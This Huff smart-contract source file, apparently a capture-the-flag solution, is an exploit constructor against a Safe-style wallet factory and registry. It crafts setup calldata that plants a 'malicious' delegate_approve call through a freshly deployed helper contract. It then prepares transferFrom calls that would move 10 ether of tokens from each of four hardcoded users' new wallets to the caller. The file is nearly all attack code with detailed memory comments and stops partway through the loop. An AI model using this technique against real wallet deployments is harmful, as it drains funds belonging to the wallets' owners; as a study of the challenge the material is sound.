// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // We will build out the calldata and load arguments into mem as needed

    // Copy `createProxyWithCallback(address,bytes,uint256,address)` func sig into mem 
    0xd18af54d             // [0xd18af54d]
    returndatasize         // [0xd18af54d, 0x00]
    mstore                 // [] - copied function sig into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    
    // Copy params for `createProxyWithCallback` into mem
    0x20               // [0x20] - size code we will copy (address)
    0x120              // [0x120, 0x20] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0x120, 0x20] - size of code from current environment
    sub                // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 2nd arg is)
    msize              // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy           // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)

    0x80               // [0x80] - bytes param offset
    msize              // [0x40, 0x80] - byte offset in mem
    mstore             // [] - copied byte param offset into mem at offset 0x40

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 

    0x20               // [0x20] - size code we will copy (address)
    0x100              // [0x100, 0x20] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0x100, 0x20] - size of code from current environment
    sub                // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 3rd arg is)
    0x80               // [0x80, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy           // [] - consumes 3 items off stack. Copies specified code to specified memory location (0x60 is 0 initialized)

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)

    0x1c4              // [0x1c4] bytes param length
    msize              // [0xa0, 0x1c4] - byte offset in mem
    mstore             // [] - copied bytes param length into mem at offset 0xa0

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000000001c4 -> byte param length (0x1c4) - 452 bytes

    // This is where it gets interesting. From this point on we will be builidng the calldata for the following:
    // setup(address[],uint256,address,bytes,address,address,uint256,address)
    0xb63e800d          // [0xb63e800d] - func sig for `setup(...)`
    0xe0                // [0xe0, 0xb63e800d] - # of bits to shift left by
    shl                 // [0xb63e800d_] - shifted func sig 224 bits to the left. Converting it to bytes8
    msize               // [0xc0, 0xb63e800d_] - byte offset in mem
    mstore              // [] - copied func sig into mem at offset 0xc0
    
    0x100               // [0x100] - address[] offset in `setup` function
    0xc4                // [0xc4, 0x100] - byte offset in mem (right after func sig)
    mstore              // [] - copied address[] offset in mem at offset 0xc4
    
    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000000001c4 -> byte param length (0x1c4) - 452 bytes
    // [OFFSET 0xc0]   b63e800d00000000000000000000000000000000000000000000000000000000 -> bytes param func selector `setup(...)` +  first 28 bytes of 1st arg offset (address[])
    // [OFFSET 0xe0]   0000010000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg offset (address[]) + first 28 bytes of 2nd arg (uint256) 

    0x01                // [0x01] - threshold
    0xe4                // [0xe0, 0x01] - byte offset in mem (right after address[] offset)
    mstore              // [] - copied threshold (0x01) into mem at offset 0xe4
    
    // The next 32 bytes are the address of the contract we create using create2

    0x140               // [0x140] - bytes param offset in `setup` function
    0x124               // [0x124, 0x140] - byte offset in mem (right after contract we created *will create later*)
    mstore              // [] - copied bytes param offset in `setup` function into mem at offset 0x124

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000000001c4 -> byte param length (0x1c4) - 452 bytes
    // [OFFSET 0xc0]   b63e800d00000000000000000000000000000000000000000000000000000000 -> bytes param func selector `setup(...)` +  first 28 bytes of 1st arg offset (address[])
    // [OFFSET 0xe0]   0000010000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg offset (address[]) + first 28 bytes of 2nd arg (uint256)
    // [OFFSET 0x100]  00000001000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> last 4 bytes of second arg (uint256) + first 28 bytes of 3rd arg (address we create)
    // [OFFSET 0x120]  8176a1e700000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 3rd arg (address we create) + first 28 bytes of 4th arg offset (bytes)
    // [OFFSET 0x140]  0000014000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 4th arg offset (bytes) + first 28 bytes of 5th arg (address/empty)
    
    // The next 4 params are all initialized to 0. We will continue by copying the length of the address[] param into mem
    0x01                // [0x01] - length of address[] param for `setup` function
    0x1c4               // [0x1c4, 0x01] - byte offset in mem (the previous 128 bytes were initialized to 0 since they are empty values)
    mstore              // [] - copied length of address[] param into mem at offset 0x1c4

    // The next 32 bytes will be copied into mem from within each loop (this is the user address)

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000000001c4 -> byte param length (0x1c4) - 452 bytes
    // [OFFSET 0xc0]   b63e800d00000000000000000000000000000000000000000000000000000000 -> bytes param func selector `setup(...)` +  first 28 bytes of 1st arg offset (address[])
    // [OFFSET 0xe0]   0000010000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg offset (address[]) + first 28 bytes of 2nd arg (uint256)
    // [OFFSET 0x100]  00000001000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> last 4 bytes of second arg (uint256) + first 28 bytes of 3rd arg (address)
    // [OFFSET 0x120]  8176a1e700000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 3rd arg (address *address we deploy with create*) + first 28 bytes of 4th arg offset (bytes)
    // [OFFSET 0x140]  0000014000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 4th arg offset (bytes) + first 28 bytes of 5th arg (address/empty)
    // [OFFSET 0x160]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 5th arg (address/empty) + first 28 bytes of 6th arg (address/empty)
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 6th arg (address/empty) + first 28 bytes of 7th arg (uint256/empty)
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 7th arg (uint256/empty) + first 28 bytes of 8th arg (address/empty)
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 8th arg (address/empty) + first 28 bytes of 1st arg length (address[])
    // [OFFSET 0x1e0]  0000000100000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg length (address[]) + first 28 bytes of 1st arg value (user) - changes with each loop

    0x44                // [0x44] - bytes param legnth in `setup` function
    0x204               // [0x204, 0x44] - byte offset in mem (right after user address)
    mstore              // [] - copied bytes param length into mem at offset 0x204

    // now we are going to copy the calldata for our malicious function call into mem: `delegate_approve(address,address)` - This is the value of the bytes param in the `setup` function
    0xc0cad421          // [0xc0cad421] - func sig for `delegate_approve`
    0xe0                // [0xe0, 0xc0cad421] - # of bytes to shift left by
    shl                 // [0xc0cad421_] - shifted func sig 224 bits to the left, Converting it ot bytes8
    0x224               // [0x224, 0xc0cad421_] - byte offset in mem (right after bytes param length)
    mstore              // [] - copied func sig into mem at offset 0x224

    address             // [self] - 1st address param in `delegate_approve` function
    0x228               // [0x228, self] - byte offset in mem (right after `delegate_approve` func sig)
    mstore              // [] - copied self into mem at offset 0x228

    0x20               // [0x20] - size code we will copy (address)
    0xe0               // [0xe0, 0x20] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0xe0, 0x20] - size of code from current environment
    sub                // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 4th arg is)
    0x248              // [0x80, offset, 0x20] - byte offset in memory where code will be copied to (right after self)
    codecopy           // [] - consumes 3 items off stack. Copies specified code to specified memory location 

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000000001c4 -> byte param length (0x1c4) - 452 bytes
    // [OFFSET 0xc0]   b63e800d00000000000000000000000000000000000000000000000000000000 -> bytes param func selector `setup(...)` +  first 28 bytes of 1st arg offset (address[])
    // [OFFSET 0xe0]   0000010000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg offset (address[]) + first 28 bytes of 2nd arg (uint256)
    // [OFFSET 0x100]  00000001000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> last 4 bytes of second arg (uint256) + first 28 bytes of 3rd arg (address)
    // [OFFSET 0x120]  8176a1e700000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 3rd arg (address *address we deploy with create*) + first 28 bytes of 4th arg offset (bytes)
    // [OFFSET 0x140]  0000014000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 4th arg offset (bytes) + first 28 bytes of 5th arg (address/empty)
    // [OFFSET 0x160]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 5th arg (address/empty) + first 28 bytes of 6th arg (address/empty)
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 6th arg (address/empty) + first 28 bytes of 7th arg (uint256/empty)
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 7th arg (uint256/empty) + first 28 bytes of 8th arg (address/empty)
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 8th arg (address/empty) + first 28 bytes of 1st arg length (address[])
    // [OFFSET 0x1e0]  0000000100000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg length (address[]) + first 28 bytes of 1st arg value (user) - changes with each loop
    // [OFFSET 0x200]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg value (user) + first 28 bytes of 4th bytes arg length (bytes) - 44
    // [OFFSET 0x220]  00000044c0cad4210000000000000000000000006b63b0441371ddfbd65a65ef -> last 4 bytes of 4th bytes arg length (bytes) + function sig for malicious data + first 24 bytes of 1st malicious data arg (address/self)
    // [OFFSET 0x240]  27642e7a622f29dd000000000000000000000000f2df0b975c0c9efa2f8ca049 -> last 8 bytes of 1st malicious data arg + first 24 bytes of 2nd malicious data arg (address/token)
    // [OFFSET 0x260]  1c2d1685104d2488000000000000000000000000000000000000000000000000 -> last 8 bytes of 2nd malicious data arg (address/token) + 24 bytes padding

    // within each loop we will also need to call `transferFrom`. We will copy that calldata into mem as well
    0x23b872dd          // [0x23b872dd] - func sig for `transferFrom(address,address,uint256)`
    0x2a0               // [0x280, 0x23b872dd] - byte offset in mem (0x280 has 32 bytes of padding)
    mstore              // [] - copied func sig into mem at offset 0x2a0

    caller              // [caller] - msg.sender
    0x2e0               // [0x2e0, caller] - byte offset in mem (0x2c0 is initialized to 0. This is where return data form `createProxyWithCallback` will be copied)
    mstore              // [] - copied msg.sender into mem at offset 0x2e0

    0x8AC7230489E80000  // [0x8AC7230489E80000] - 10 ether
    0x300               // [0x300, 0x8AC7230489E80000] - byte offset in mem
    mstore              // [] - copied 10 ether into mem at offset 0x300

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000000001c4 -> byte param length (0x1c4) - 452 bytes
    // [OFFSET 0xc0]   b63e800d00000000000000000000000000000000000000000000000000000000 -> bytes param func selector `setup(...)` +  first 28 bytes of 1st arg offset (address[])
    // [OFFSET 0xe0]   0000010000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg offset (address[]) + first 28 bytes of 2nd arg (uint256)
    // [OFFSET 0x100]  00000001000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> last 4 bytes of second arg (uint256) + first 28 bytes of 3rd arg (address)
    // [OFFSET 0x120]  8176a1e700000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 3rd arg (address *address we deploy with create*) + first 28 bytes of 4th arg offset (bytes)
    // [OFFSET 0x140]  0000014000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 4th arg offset (bytes) + first 28 bytes of 5th arg (address/empty)
    // [OFFSET 0x160]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 5th arg (address/empty) + first 28 bytes of 6th arg (address/empty)
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 6th arg (address/empty) + first 28 bytes of 7th arg (uint256/empty)
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 7th arg (uint256/empty) + first 28 bytes of 8th arg (address/empty)
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 8th arg (address/empty) + first 28 bytes of 1st arg length (address[])
    // [OFFSET 0x1e0]  0000000100000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg length (address[]) + first 28 bytes of 1st arg value (user) - changes with each loop
    // [OFFSET 0x200]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg value (user) + first 28 bytes of 4th bytes arg length (bytes) - 44
    // [OFFSET 0x220]  00000044c0cad4210000000000000000000000006b63b0441371ddfbd65a65ef -> last 4 bytes of 4th bytes arg length (bytes) + function sig for malicious data + first 24 bytes of 1st malicious data arg (address/self)
    // [OFFSET 0x240]  27642e7a622f29dd000000000000000000000000f2df0b975c0c9efa2f8ca049 -> last 8 bytes of 1st malicious data arg + first 24 bytes of 2nd malicious data arg (address/token)
    // [OFFSET 0x260]  1c2d1685104d2488000000000000000000000000000000000000000000000000 -> last 8 bytes of 2nd malicious data arg (address/token) + 24 bytes padding
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
    // [OFFSET 0x2a0]  0000000000000000000000000000000000000000000000000000000023b872dd -> 4 bytes padding from above calldata + `transferFrom(address,address,uint256)` func sig
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> return data from `createProxyWithCallback` (address) - this changes with each loop
    // [OFFSET 0x2e0]  000000000000000000000000c89D42189f0450C2b2c3c61f58Ec5d628176A1E7 -> msg.sender
    // [OFFSET 0x300]  0000000000000000000000000000000000000000000000008AC7230489E80000 -> amount (uint256) this will be hardcoded to 0x8AC7230489E80000 (10 ether)

    // load users array into mem. we already know the length has to be 4 so we could just load in each user and keep length on stack
    // bytes needed to calc offset for 1st user: 0x80
    0x20               // [0x20] - size code we will copy (address)
    0x80               // [0x80, 0x20] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0x80, 0x20] - size of code from current environment
    sub                // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 1st user in array is)
    msize              // [0x320, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy           // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // ...
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
    // [OFFSET 0x2a0]  0000000000000000000000000000000000000000000000000000000023b872dd -> 4 bytes padding from above calldata + `transferFrom(address,address,uint256)` func sig
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> return data from `createProxyWithCallback` (address) - this changes with each loop
    // [OFFSET 0x2e0]  000000000000000000000000c89D42189f0450C2b2c3c61f58Ec5d628176A1E7 -> msg.sender
    // [OFFSET 0x300]  0000000000000000000000000000000000000000000000008AC7230489E80000 -> amount (uint256) this will be hardcoded to 0x8AC7230489E80000 (10 ether)
    // [OFFSET 0x320]  000000000000000000000000318b469BBa396AEc2C60342F9441be36A1945174 -> first user in array

    // bytes needed to calc offset for 2nd user: 0x60

    0x20               // [0x20] - size code we will copy (address)
    0x60               // [0x60, 0x20] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0x60, 0x20] - size of code from current environment
    sub                // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 2nd user in array is)
    msize              // [0x340, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy           // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // ...
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
    // [OFFSET 0x2a0]  0000000000000000000000000000000000000000000000000000000023b872dd -> 4 bytes padding from above calldata + `transferFrom(address,address,uint256)` func sig
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> return data from `createProxyWithCallback` (address) - this changes with each loop
    // [OFFSET 0x2e0]  000000000000000000000000c89D42189f0450C2b2c3c61f58Ec5d628176A1E7 -> msg.sender
    // [OFFSET 0x300]  0000000000000000000000000000000000000000000000008AC7230489E80000 -> amount (uint256) this will be hardcoded to 0x8AC7230489E80000 (10 ether)
    // [OFFSET 0x320]  000000000000000000000000318b469BBa396AEc2C60342F9441be36A1945174 -> first user in array
    // [OFFSET 0x340]  0000000000000000000000001e14cBD146c3a5496F588CF28Ee656c210057904 -> second user in array

    // bytes needed to calc offset for 3rd user: 0x40

    0x20               // [0x20] - size code we will copy (address)
    0x40               // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0x40, 0x20] - size of code from current environment
    sub                // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 3rd user in array is)
    msize              // [0x360, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy           // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // ...
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
    // [OFFSET 0x2a0]  0000000000000000000000000000000000000000000000000000000023b872dd -> 4 bytes padding from above calldata + `transferFrom(address,address,uint256)` func sig
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> return data from `createProxyWithCallback` (address) - this changes with each loop
    // [OFFSET 0x2e0]  000000000000000000000000c89D42189f0450C2b2c3c61f58Ec5d628176A1E7 -> msg.sender
    // [OFFSET 0x300]  0000000000000000000000000000000000000000000000008AC7230489E80000 -> amount (uint256) this will be hardcoded to 0x8AC7230489E80000 (10 ether)
    // [OFFSET 0x320]  000000000000000000000000318b469BBa396AEc2C60342F9441be36A1945174 -> first user in array
    // [OFFSET 0x340]  0000000000000000000000001e14cBD146c3a5496F588CF28Ee656c210057904 -> second user in array
    // [OFFSET 0x360]  00000000000000000000000063953eB1B3D8DB28334E7C1C69456C851F934199 -> third user in array

    // bytes needed to calc offset for 4nd user: 0x20

    0x20               // [0x20] - size code we will copy (address)
    dup1               // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0x20, 0x20] - size of code from current environment
    sub                // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 4th user in array is)
    msize              // [0x380, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy           // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // ...
    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
    // [OFFSET 0x2a0]  0000000000000000000000000000000000000000000000000000000023b872dd -> 4 bytes padding from above calldata + `transferFrom(address,address,uint256)` func sig
    // [OFFSET 0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> return data from `createProxyWithCallback` (address) - this changes with each loop
    // [OFFSET 0x2e0]  000000000000000000000000c89D42189f0450C2b2c3c61f58Ec5d628176A1E7 -> msg.sender
    // [OFFSET 0x300]  0000000000000000000000000000000000000000000000008AC7230489E80000 -> amount (uint256) this will be hardcoded to 0x8AC7230489E80000 (10 ether)
    // [OFFSET 0x320]  000000000000000000000000318b469BBa396AEc2C60342F9441be36A1945174 -> first user in array
    // [OFFSET 0x340]  0000000000000000000000001e14cBD146c3a5496F588CF28Ee656c210057904 -> second user in array
    // [OFFSET 0x360]  00000000000000000000000063953eB1B3D8DB28334E7C1C69456C851F934199 -> third user in array
    // [OFFSET 0x380]  0000000000000000000000001e6f0dfb1775f5032f12f56a01526351eD3F07aF -> fourth user in array

    // build out init bytecode for our helper contract in mem
    // note that helper contract code checks for appropriate function sig. This is not necessary for the chall, but did it as an exercise to replicate 
    // logic in vyper contract
    0x603e8060093d393df33d3560e01c63c0cad42114610015575b60006000fd5b60 
    0x3a0              
    mstore             
    0x043563095ea7b33d525952678ac7230489e8000059523d3d6044601c3d602435 
    0x3c0
    mstore
   __RIGHTPAD(0x5af11561000f57)
    0x3e0
    mstore

    // create helper contract and store it in appropriate offset in mem to use in calldata
    0x47               // [0x47] - size
    0x3a0              // [0x3a0, 0x47] - offset in mem
    callvalue          // [0x00, 0x3a0, 0x47] - msg.value to send
    create             // [address] - created address
    dup1               // [address,address]
    iszero             // [0/1, address] - if creation failed, address will be 0x0
    throw_error        // [throw_error, 0/1, address]
    jumpi              // [address]
    0x104              // [0x104, address] - byte offset in mem
    mstore             // [] - copied address into mem at offset 0x108

    // ...
    // [OFFSET 0x100]  000000010000000000000000000000009f2839818695420c975b716e7d41380d -> last 4 bytes of second arg (uint256) + first 28 bytes of 3rd arg (*address we create*)
    // [OFFSET 0x120]  043d116a00000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 3rd arg (*address we create*) + first 28 bytes of 4th arg offset (bytes)
    // ...

    // Loop through users array and call `createProxyWithCallback` and `transferFrom` for each user
    // Need to copy factory and token onto stack to use for calls
    0x248              // [0x248] - byte offset in mem
    mload              // [token] - copied token onto stack

    0x20               // [0x20, token] - size code we will copy (address)
    0x140              // [0x140, 0x20, token] - value used to calculate offset in code to copy from
    codesize           // [codesize, 0x140, 0x20, token] - size of code from current environment
    sub                // [offset, 0x20, token] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (where 1st arg is)
    0x3a0              // [0x3a0, offset, 0x20, token] - byte offset in memory where code will be copied to
    codecopy           // [token] - consumes 3 items off stack. Copies specified code to specified memory location
    0x3a0              // [0x3a0, token] - byte offset in mem
    mload              // [factory, token] - copied factory onto stack
    
    // stack items to help with loop
    0x00              // [index, factory, token] - index
    0x300             // [prev_offset, index, factory, token] - used to calc offset

    // Loop through each item in array and CALL into Factory and Token
    loop:
        0x20          // [0x20, prev_offset, index, factory, token] - 32 bytes
        add           // [offset, index, factory, token] - get offset of array[index]
        dup1          // [offset, offset, index, factory, token]
        mload         // [item, offset, index, factory, token] - copied item onto stack from offset
        0x1e4         // [0x1e4, item, offset, index, factory, token] - byte offset in mem
        mstore        // [offset, index, factory, token] - copied item into mem at offset 0x1e4

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000d18af54d -> `createProxyWithCallback(address,bytes,uint256,address)` func sig
    // [OFFSET 0x20]   000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> singleton (2nd constructor arg)
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty (uint256)
    // [OFFSET 0x80]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> callback (3rd constructor arg)
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000000001c4 -> byte param length (0x1c4) - 452 bytes
    // [OFFSET 0xc0]   b63e800d00000000000000000000000000000000000000000000000000000000 -> bytes param func selector `setup(...)` +  first 28 bytes of 1st arg offset (address[])
    // [OFFSET 0xe0]   0000010000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg offset (address[]) + first 28 bytes of 2nd arg (uint256)
    // [OFFSET 0x100]  000000010000000000000000000000009f2839818695420c975b716e7d41380d -> last 4 bytes of second arg (uint256) + first 28 bytes of 3rd arg (*address we create*)
    // [OFFSET 0x120]  043d116a00000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 3rd arg (*address we create*) + first 28 bytes of 4th arg offset (bytes)
    // [OFFSET 0x140]  0000014000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 4th arg offset (bytes) + first 28 bytes of 5th arg (address/empty)
    // [OFFSET 0x160]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 5th arg (address/empty) + first 28 bytes of 6th arg (address/empty)
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 6th arg (address/empty) + first 28 bytes of 7th arg (uint256/empty)
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 7th arg (uint256/empty) + first 28 bytes of 8th arg (address/empty)
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 8th arg (address/empty) + first 28 bytes of 1st arg length (address[])
    // [OFFSET*0x1e0]  0000000100000000000000000000000000000000000000000000000000000000 -> last 4 bytes of 1st arg length (address[]) + ***first 28 bytes of array[index]***
    // [OFFSET*0x200]  0000000000000000000000000000000000000000000000000000000000000000 -> ***last 4 bytes of array[index]*** + first 28 bytes of 4th bytes arg length (bytes) - 44
    // [OFFSET 0x220]  00000044c0cad4210000000000000000000000006b63b0441371ddfbd65a65ef -> last 4 bytes of 4th bytes arg length (bytes) + function sig for malicious data + first 24 bytes of 1st malicious data arg (address/self)
    // [OFFSET 0x240]  27642e7a622f29dd000000000000000000000000f2df0b975c0c9efa2f8ca049 -> last 8 bytes of 1st malicious data arg + first 24 bytes of 2nd malicious data arg (address/token)
    // [OFFSET 0x260]  1c2d1685104d2488000000000000000000000000000000000000000000000000 -> last 8 bytes of 2nd malicious data arg (address/token) + 24 bytes padding
